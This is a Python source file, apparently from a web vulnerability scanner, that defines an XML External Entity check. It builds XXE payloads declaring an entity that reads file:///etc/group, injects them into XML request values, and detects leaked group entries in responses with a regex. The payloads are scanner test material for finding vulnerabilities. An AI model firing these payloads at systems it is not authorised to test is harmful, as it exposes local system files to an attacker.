import re
import string
from ava.common import utility
from ava.common.check import _ValueCheck


# metadata
name = __name__
description = "checks for xml external entity"


class XmlExternalEntityCheck(_ValueCheck):
    """
    Checks for XML External Entity (XXE) by accessing local files. The payloads use XXE replacements to reference
    /etc/group.
    """
    key = "xxe.value.file"
    name = "XML External Entity"
    description = "Checks for XML External Entity by accessing local files"

    def __init__(self):
        """Define static payloads"""
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE {} [<!ENTITY {} SYSTEM "file:///etc/group">]><{}>&{};</{}>'
        ]

        # generate random
        self._random = utility.generate_random(string.ascii_lowercase, size=4)

        # add to payloads
        root, entity = (self._random[::-1], self._random)
        self._payloads = [payload.format(root, entity, root, entity, root) for payload in payloads]

    def payloads(self, url, target, value):
        """
        Returns the check's payloads. Uses the target's value to replace text instances with XXE payloads within XML.
        :param url: url value
        :param target: target name
        :param value: target value
        :return: list of payloads
        """
        dynamics = []

        # dtd template
        template = '<?xml version="1.0"?><!DOCTYPE {} [<!ENTITY {} SYSTEM "file:///etc/group">]>'

        # check xml format and parse
        if value and value[0] == '<' and value[-1] == '>':
            parsed = utility.parse_xml(value)

            if parsed:
                # set dtd and entity reference
                dtd = template.format(parsed.root_tag, self._random)
                entity = '&' + self._random + ';'

                # add entity to each replacement
                for replacement in parsed.replace(entity):
                    payload = dtd + replacement
                    dynamics.append(payload)

        # return static and dynamic
        return self._payloads + dynamics

    def check(self, response, payload):
        """
        Checks for XXE by looking for /etc/group entries in the response's body.
        :param response: response object from server
        :param payload: payload value
        :return: true if vulnerable, false otherwise
        """
        # check response body
        if not response.text:
            return False

        # check entries
        # group:x:id:users
        regex = r"(\w+:x:\d+:[\w,]*\W+)+"
        if re.search(regex, response.text):
            return True
        else:
            return False
